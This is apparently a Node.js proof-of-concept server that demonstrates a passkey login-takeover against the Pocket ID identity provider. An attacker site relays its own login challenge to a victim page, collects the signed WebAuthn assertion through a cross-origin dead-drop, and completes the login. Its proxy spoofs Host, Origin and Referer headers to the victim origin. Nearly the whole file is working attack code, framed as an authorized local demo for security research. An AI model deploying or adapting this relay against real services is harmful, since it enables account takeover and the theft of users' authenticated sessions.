// Frontend passkey login-takeover demo over Pocket ID, with the attacker on a SEPARATE origin.
//
// Run two instances of this one file:
//   ROLE=victim   PORT=1411  Acme Workspace: /login + enrollment, proxies /api to Pocket ID.
//   ROLE=attacker PORT=1413  the attacker's own site: /attacker + the dead-drop, plus its own
//                            /api proxy to the SAME Pocket ID so its tab can run login/finish.
//
// The attacker never signs. The victim signs on Acme's origin, so the assertion stays bound to
// Acme; Pocket ID validates it against APP_URL (Acme) no matter where the attacker's tab lives.
// The attacker's proxy rewrites Host/Origin to the victim origin so Pocket ID accepts its calls.
//
// Authorized demo use only: your own local Pocket ID + disposable test users.
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROLE = process.env.ROLE === 'attacker' ? 'attacker' : 'victim';
const PORT = Number(process.env.PORT || (ROLE === 'attacker' ? 1413 : 1411));
const PID = { host: '127.0.0.1', port: Number(process.env.PID_PORT || 1412) };
const VICTIM_ORIGIN = process.env.VICTIM_ORIGIN || 'http://localhost:1411'; // Pocket ID's APP_URL / where the victim signs
const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Share the admin key with Pocket ID via the same .env (optional: enables open sign-up).
if (!process.env.STATIC_API_KEY) {
  try { const m = /^STATIC_API_KEY=(.+)$/m.exec(readFileSync(path.join(__dirname, '.env'), 'utf8')); if (m) process.env.STATIC_API_KEY = m[1].trim(); } catch {}
}
const API_KEY = process.env.STATIC_API_KEY || '';

// Attacker-only dead-drop: one nonce the attacker is waiting on, and the assertions victims drop.
let offer = null;
const assertions = [];

const json = (res, code, body) => { res.writeHead(code, { 'content-type': 'application/json', 'cache-control': 'no-store' }); res.end(JSON.stringify(body)); };
const readBody = (req) => new Promise((r) => { let d = ''; req.on('data', (c) => (d += c)); req.on('end', () => r(d)); });
async function serveFile(res, file) {
  try { const html = await readFile(path.join(__dirname, 'public', file)); res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' }); res.end(html); }
  catch { json(res, 404, { error: 'not found' }); }
}
// The victim page lives on another origin, so the dead-drop answers cross-origin requests.
const cors = (res) => { res.setHeader('access-control-allow-origin', VICTIM_ORIGIN); res.setHeader('access-control-allow-methods', 'GET,POST,OPTIONS'); res.setHeader('access-control-allow-headers', 'content-type'); };

// Reverse proxy to Pocket ID. On the attacker site, rewrite Host/Origin to the victim origin so
// Pocket ID treats the attacker's API calls as coming from APP_URL and validates them normally.
function proxy(req, res) {
  const headers = { ...req.headers };
  if (ROLE === 'attacker') {
    headers.host = new URL(VICTIM_ORIGIN).host;
    if (headers.origin) headers.origin = VICTIM_ORIGIN;
    if (headers.referer) headers.referer = VICTIM_ORIGIN + '/';
    delete headers['x-forwarded-host']; delete headers['x-forwarded-proto'];
  }
  const p = http.request({ host: PID.host, port: PID.port, method: req.method, path: req.url, headers }, (pr) => { res.writeHead(pr.statusCode, pr.headers); pr.pipe(res); });
  p.on('error', () => json(res, 502, { error: 'pocket-id unreachable' }));
  req.pipe(p);
}

// Server-side call to Pocket ID (used only by the victim's /x/signup for enrollment).
function pid(method, pathname, { body, apiKey } = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? Buffer.from(JSON.stringify(body)) : null;
    const headers = { accept: 'application/json', host: new URL(VICTIM_ORIGIN).host };
    if (data) { headers['content-type'] = 'application/json'; headers['content-length'] = data.length; }
    if (apiKey && API_KEY) headers['x-api-key'] = API_KEY;
    const r = http.request({ host: PID.host, port: PID.port, method, path: pathname, headers }, (pr) => {
      const chunks = []; pr.on('data', (c) => chunks.push(c)); pr.on('end', () => resolve({ status: pr.statusCode, headers: pr.headers, body: Buffer.concat(chunks).toString() }));
    });
    r.on('error', reject); if (data) r.write(data); r.end();
  });
}

const server = http.createServer(async (req, res) => {
  const pth = new URL(req.url, 'http://localhost').pathname;

  if (ROLE === 'attacker') {
    if (req.method === 'OPTIONS' && pth.startsWith('/x/')) { cors(res); res.writeHead(204); return res.end(); }
    // The attacker publishes the nonce from the login it started (but will not finish yet).
    if (pth === '/x/offer' && req.method === 'POST') {
      const b = JSON.parse((await readBody(req)) || '{}'); if (!b.challenge) return json(res, 400, { error: 'no challenge' });
      offer = { challenge: b.challenge, rpId: b.rpId || 'localhost', at: Date.now() }; cors(res); return json(res, 200, { ok: true });
    }
    // The victim's page (another origin) picks up that nonce to sign.
    if (pth === '/x/offer' && req.method === 'GET') { cors(res); return json(res, 200, offer || {}); }
    // The victim drops the signed assertion; the attacker finishes the login with it.
    if (pth === '/x/assertion' && req.method === 'POST') {
      const b = JSON.parse((await readBody(req)) || '{}'); if (!b.assertion) return json(res, 400, { error: 'no assertion' });
      assertions.push({ assertion: b.assertion, at: Date.now() }); cors(res); return json(res, 200, { ok: true });
    }
    if (pth === '/x/assertion' && req.method === 'GET') { cors(res); return json(res, 200, assertions.shift() || {}); }
    if (pth === '/x/reset' && req.method === 'POST') { offer = null; assertions.length = 0; cors(res); return json(res, 200, { ok: true }); }
    if (pth === '/' || pth === '/attacker') return serveFile(res, 'attacker.html');
    return proxy(req, res); // /api -> Pocket ID (Host/Origin rewritten to the victim origin)
  }

  // ROLE victim (Acme Workspace)
  // Open sign-up: create a Pocket ID user (admin key) + mint a one-time token the browser exchanges.
  if (pth === '/x/signup' && req.method === 'POST') {
    if (!API_KEY) return json(res, 200, { ok: false, error: 'open sign-up needs STATIC_API_KEY (use the first-user setup instead)' });
    const b = JSON.parse((await readBody(req)) || '{}');
    if (!b.username || !b.email) return json(res, 400, { error: 'username and email required' });
    try {
      const c = await pid('POST', '/api/users', { apiKey: true, body: { firstName: b.firstName || '', lastName: b.lastName || '', username: b.username, email: b.email, disabled: false } });
      if (c.status >= 300) return json(res, 200, { ok: false, error: 'create ' + c.status + ' ' + c.body.slice(0, 160) });
      const userId = JSON.parse(c.body).id;
      const t = await pid('POST', `/api/users/${userId}/one-time-access-token`, { apiKey: true, body: {} });
      return json(res, 200, { ok: true, token: JSON.parse(t.body).token });
    } catch (e) { return json(res, 502, { ok: false, error: e.message }); }
  }
  if (pth === '/') { res.writeHead(302, { location: '/login' }); return res.end(); }
  if (pth === '/login') return serveFile(res, 'login.html');
  return proxy(req, res); // /api -> Pocket ID (enrollment + assets)
});

server.listen(PORT, () => console.log(`${ROLE} site on http://localhost:${PORT}  (/api -> Pocket ID ${PID.host}:${PID.port}${ROLE === 'attacker' ? ', drop here' : ''})`));
